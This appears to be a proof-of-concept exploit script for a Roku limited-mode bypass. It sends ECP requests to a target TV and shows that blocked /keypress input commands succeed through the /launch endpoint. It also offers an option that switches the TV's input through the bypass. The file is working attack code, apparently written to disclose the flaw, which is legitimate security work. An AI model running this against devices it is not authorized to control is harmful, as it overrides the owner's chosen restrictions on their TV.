#!/usr/bin/env python3
"""
PoC: Roku ECP Limited Mode Bypass via /launch Endpoint

Proves that /keypress/InputHDMI1 is blocked (403) in limited mode
while /launch/tvinput.hdmi1 performs the same action and returns 200.

Usage: python3 poc.py --ip <ROKU_IP> --poc

Tested: TCL 32S327, Roku OS 16.0.4 (Build 48H.04E00853A)
Author: NSM Barii
"""



import sys, argparse, requests

# UI IMPORTS
from rich.console import Console


# CONSTANTS
console = Console()


DEFAULT_PORT = 8060

INPUTS = [
    "tvinput.hdmi1", "tvinput.hdmi2", "tvinput.hdmi3", "tvinput.hdmi4",
    "tvinput.dtv", "tvinput.cvbs",
]

KEYPRESSES = [
    "InputHDMI1", "InputHDMI2", "InputHDMI3", "InputHDMI4",
    "InputTuner", "InputAV1",
]



class Roku():
    """This class will demonstrate the ECP /launch bypass of limited mode"""


    @classmethod
    def _run(cls, ip, port, path, post=False, get=False, verbose=True):
        """This method will house code made from requests"""

        try:

            url = f"http://{ip}:{port}{path}"

            if post: response = requests.post(url=url, timeout=5)
            elif get: response = requests.get(url=url, timeout=5)

            method = "post" if post else "get"

            if verbose: console.print(f"[bold green][+] {method} [yellow] status_code: {response.status_code}")

            return response

        except Exception as e: print(f"[+] Exception Error: {url} --> {e}")


    @classmethod
    def _poc(cls, ip, port):
        """This method will run the full CVE proof — keypress blocked, /launch bypasses"""


        console.print(f"\n[bold green][*] Target:[yellow] {ip}:{port}")
        console.print(f"[bold green][*] Running CVE PoC: ECP /launch bypasses limited mode\n")


        # 1
        console.print(f"[bold cyan][*] ECP keypress check (should be blocked):")

        for key in KEYPRESSES:

            response = cls._run(ip=ip, port=port, path=f"/keypress/{key}", post=True, verbose=False)

            if response is not None and response.status_code == 403:  console.print(f"[bold red]    /keypress/{key}: {response.status_code} — BLOCKED")
            elif response is not None: console.print(f"[bold green]    /keypress/{key}: {response.status_code} — OPEN")


        # 2
        console.print(f"\n[bold cyan][*] ECP /launch bypass (same actions, should work):")

        for inp in INPUTS:

            response = cls._run(ip=ip, port=port, path=f"/launch/{inp}", post=True, verbose=False)

            if response is not None and response.status_code == 200: console.print(f"[bold green]    /launch/{inp}: {response.status_code} — BYPASSED")
            elif response is not None: console.print(f"[bold red]    /launch/{inp}: {response.status_code} — FAILED")


        # 3
        console.print(f"\n[bold cyan][*] Side-by-side comparison:")

        pairs = [
            ("InputHDMI1", "tvinput.hdmi1"),
            ("InputTuner", "tvinput.dtv"),
        ]

        for keypress, launch in pairs:

            r1 = cls._run(ip=ip, port=port, path=f"/keypress/{keypress}", post=True, verbose=False)
            r2 = cls._run(ip=ip, port=port, path=f"/launch/{launch}", post=True, verbose=False)

            k_code = r1.status_code if r1 is not None else "ERR"
            l_code = r2.status_code if r2 is not None else "ERR"

            console.print(f"[bold red]    /keypress/{keypress}: {k_code}")
            console.print(f"[bold green]    /launch/{launch}: {l_code}")

            if k_code == 403 and l_code == 200:
                console.print(f"[bold yellow]    ^ BYPASS CONFIRMED — same action, different result")

            console.print()



    @classmethod
    def main(cls):
        """This will spearhead this class"""



        parser = argparse.ArgumentParser(
            description="PoC for ECP /launch bypass of limited mode on Roku TVs",
            add_help=True)


        parser.add_argument("--ip", help="Target Roku IP Address")
        parser.add_argument("--port", default=DEFAULT_PORT, help="ECP port")
        parser.add_argument("--poc", action="store_true", help="Run the full CVE proof (keypress blocked -> /launch bypasses)")
        parser.add_argument("-k", help=f"Switch to a specific input via /launch. Options: {INPUTS}")
        parser.add_argument("--inputs", action="store_true", help="List all available TV inputs")


        args = parser.parse_args()


        ip     = args.ip
        port   = args.port
        key    = args.k
        inputs = args.inputs
        poc    = args.poc



        if inputs: console.print(f"[bold green][+] Inputs:[yellow] {INPUTS}"); sys.exit()

        if not ip: console.print(f"[bold red][!] Roku IP needed and not given!"); sys.exit()

        if poc: cls._poc(ip=ip, port=port); sys.exit()

        if not key: console.print(f"[bold red][!] Input key needed! Use --inputs to see options"); sys.exit()
        if key and key not in INPUTS: console.print(f"[bold red][!] Input given doesnt match available inputs... exiting!"); sys.exit()

        cls._run(ip=ip, port=port, path=f"/launch/{key}", post=True)


if __name__ == "__main__":
    Roku.main()
